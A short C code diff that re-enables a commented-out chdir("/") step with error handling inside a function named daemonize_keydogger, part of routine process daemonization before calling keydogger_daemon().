@@ -308,11 +308,11 @@ void daemonize_keydogger()
 
     mode_t new_mask = umask(0);
 
-    // if (chdir("/") < 0)
-    // {
-    //     printf("Error changing directory to /");
-    //     exit(ECHDIR);
-    // }
+    if (chdir("/") < 0)
+    {
+        printf("Error changing directory to /");
+        exit(ECHDIR);
+    }
 
     keydogger_daemon();
 }
